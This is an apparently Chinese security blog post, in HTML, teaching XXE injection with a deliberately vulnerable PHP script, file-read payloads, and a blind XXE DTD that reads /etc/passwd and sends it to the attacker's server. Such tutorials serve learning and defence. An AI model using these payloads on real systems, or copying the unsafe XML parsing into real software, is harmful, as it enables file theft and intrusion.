@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>XXE漏洞原理及简单利用 | Jh2ng’s Blog</title><meta name="keywords" content="XXE"><meta name="author" content="jh2ng"><meta name="copyright" content="jh2ng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="什么是XXE XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 XXE漏洞原理 XML可以从">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE漏洞原理及简单利用">
+<meta property="og:url" content="https://jh2ng.github.io/posts/18655/index.html">
+<meta property="og:site_name" content="Jh2ng’s Blog">
+<meta property="og:description" content="什么是XXE XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 XXE漏洞原理 XML可以从">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://b3logfile.com/file/2020/10/image-ded7f0f7.png">
+<meta property="article:published_time" content="2021-03-22T09:19:00.000Z">
+<meta property="article:modified_time" content="2022-05-25T06:39:12.147Z">
+<meta property="article:author" content="jh2ng">
+<meta property="article:tag" content="XXE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://b3logfile.com/file/2020/10/image-ded7f0f7.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://jh2ng.github.io/posts/18655/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XXE漏洞原理及简单利用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-05-25 14:39:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/font_3419878_qqo04a2a8q.css"><link rel="stylesheet" href="/css/my.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/load.gif" data-original="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-qingdan"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youqinglianjie"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwo"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://b3logfile.com/file/2020/10/image-ded7f0f7.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Jh2ng’s Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-qingdan"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youqinglianjie"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwo"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XXE漏洞原理及简单利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-22T09:19:00.000Z" title="发表于 2021-03-22 17:19:00">2021-03-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-05-25T06:39:12.147Z" title="更新于 2022-05-25 14:39:12">2022-05-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XXE漏洞原理及简单利用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h3><hr>
+<p>XXE注入，即XML External Entity，XML外部实体注入。通过 XML 实体，”SYSTEM”关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
+<h3 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h3><hr>
+<p>XML可以从外部读取DTD文件的话，那么就可以想一下，如果把读取文件的路径换成另一个文件的路径，那么是否可以读取到这个文件。如果把路径指向一个内网端口，是否能探测内部端口。另外，服务器解析XML，要么一次性加载，要么是一部分一部分的去加载，递归调用XML定义，一次性调用超量的定义，那么服务器内存就会消耗光，造成拒绝服务攻击。</p>
+<ul>
+<li>读取文件</li>
+<li>命令执行</li>
+<li>内网探测</li>
+<li>DDOS攻击</li>
+<li>钓鱼</li>
+</ul>
+<h3 id="简单XXE漏洞代码编写"><a href="#简单XXE漏洞代码编写" class="headerlink" title="简单XXE漏洞代码编写"></a>简单XXE漏洞代码编写</h3><hr>
+<ol>
+<li>常用函数介绍</li>
+</ol>
+<p>file_get_contents()函数把整个文件读入一个字符串中</p>
+<p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$str</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>simplexml_load_string函数</p>
+<p>将xml格式字符串转换为对应的simpleXMLElement</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$note</span>=<span class="string">&lt;&lt;&lt;XML</span></span><br><span class="line"><span class="string">&lt;note&gt;&lt;name&gt;aaa&lt;/name&gt;&lt;age&gt;12&lt;/age&gt;&lt;/note&gt;</span></span><br><span class="line"><span class="string">XML</span>;</span><br><span class="line"><span class="variable">$xml</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$note</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>XML注入回显 输出函数</p>
+<p>print_r()</p>
+<p>编写简单的XXE漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$xml</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="variable">$data</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);  <span class="comment">//有回显</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>eg.</p>
+<p>环境搭建</p>
+<p><img src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-33b70112.png" alt="image.png"></p>
+<p><img src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-a76cda90.png" alt="image.png"></p>
+<p>读取本地文件payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用bp抓包</p>
+<p><img src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-beb7584b.png" alt="image.png"></p>
+<p>修改请求方式，上传payload，读取C盘下的Windows.ini这个文件</p>
+<p><img src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-dbd01e8f.png" alt="image.png"></p>
+<p><img src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-1a5186d6.png" alt="image.png"></p>
+<p>成功读取到这个文件。</p>
+<h3 id="漏洞利用-任意文件读取"><a href="#漏洞利用-任意文件读取" class="headerlink" title="漏洞利用-任意文件读取"></a>漏洞利用-任意文件读取</h3><p>php中测试POC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:///path/to/file.txt</span><br><span class="line">http://url/file.txt</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br></pre></td></tr></table></figure>
+
+<p>读取文件（有回显）</p>
+<p>paylaod</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/test/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-70693e73.png" alt="image.png"></p>
+<p>读取php文件</p>
+<p><img src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-868045af.png" alt="image.png"></p>
+<p><img src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-325e35d3.png" alt="image.png"></p>
+<p>读取文件（无回显）</p>
+<p><code>print_r($data); </code>输出了我们查询的结果，如果没有这个函数的话，只有使用Blind XXE来构建一条带外信道提取数据。</p>
+<p><img src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-ded7f0f7.png" alt="image.png"></p>
+<p>请求服务器，服务器会再次向我们搭建的服务器请求dtd文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.73.134/test.dtd&quot;&gt;</span><br><span class="line">&lt;foo&gt;&amp;e1;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>构造服务器的dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &#x27;http://192.168.73.134/test.php?con=%p1;&#x27;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure>
+
+<p>服务器请求到这个dtd之后，会开始解析。然后把得到的密码通过请求参数再次访问我们的服务器，从而造成数据外带，我们可以通过抓包获取到信息。</p>
+<h3 id="XXE漏洞发现与防御"><a href="#XXE漏洞发现与防御" class="headerlink" title="XXE漏洞发现与防御"></a>XXE漏洞发现与防御</h3><p>抓包引用外部实体来探测是否存在XXE漏洞</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> <span class="string">&quot;This is test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如何防御？</p>
+<ul>
+<li>禁用外部实体</li>
+<li>过滤用户提交的参数（XML的关键词）</li>
+</ul>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/181064.html">https://www.freebuf.com/column/181064.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://pentesterlab.com/exercises/play_xxe/course">https://pentesterlab.com/exercises/play_xxe/course</a></p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://jh2ng.github.io">jh2ng</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jh2ng.github.io/posts/18655/">https://jh2ng.github.io/posts/18655/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jh2ng.github.io" target="_blank">Jh2ng’s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XXE/">XXE</a></div><div class="post_share"><div class="social-share" data-image="https://b3logfile.com/file/2020/10/image-ded7f0f7.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/493/"><img class="prev-cover" src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-2a64b551.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Nginx 介绍及基础配置</div></div></a></div><div class="next-post pull-right"><a href="/posts/26169/"><img class="next-cover" src="/img/load.gif" data-original="https://b3logfile.com/file/2020/10/image-9a7d4dd3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">浅谈CSRF漏洞原理</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/load.gif" data-original="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jh2ng</div><div class="author-info__description">忌心浮气躁，勿眼高手低</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网站建设中...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFXXE"><span class="toc-number">1.</span> <span class="toc-text">什么是XXE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">XXE漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95XXE%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99"><span class="toc-number">3.</span> <span class="toc-text">简单XXE漏洞代码编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用-任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">XXE漏洞发现与防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/18099/" title="Centos7+zabbix5.x_监控交换机">Centos7+zabbix5.x_监控交换机</a><time datetime="2022-03-20T04:40:00.000Z" title="发表于 2022-03-20 12:40:00">2022-03-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/32803/" title="Frp内网穿透实现">Frp内网穿透实现</a><time datetime="2022-01-26T07:34:00.000Z" title="发表于 2022-01-26 15:34:00">2022-01-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/34857/" title="Mybatis笔记（上）">Mybatis笔记（上）</a><time datetime="2021-05-21T06:21:00.000Z" title="发表于 2021-05-21 14:21:00">2021-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/493/" title="Nginx 介绍及基础配置">Nginx 介绍及基础配置</a><time datetime="2021-03-24T08:50:00.000Z" title="发表于 2021-03-24 16:50:00">2021-03-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/18655/" title="XXE漏洞原理及简单利用">XXE漏洞原理及简单利用</a><time datetime="2021-03-22T09:19:00.000Z" title="发表于 2021-03-22 17:19:00">2021-03-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://b3logfile.com/file/2020/10/image-ded7f0f7.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By jh2ng</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a><br>
+<a target="_blank" rel="noopener" href="https://beian.miit.gov.cn"><img src="/img/load.gif" data-original="/img/icp.png" width="24" heigh="24"><span>渝ICP备19015682号-2</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
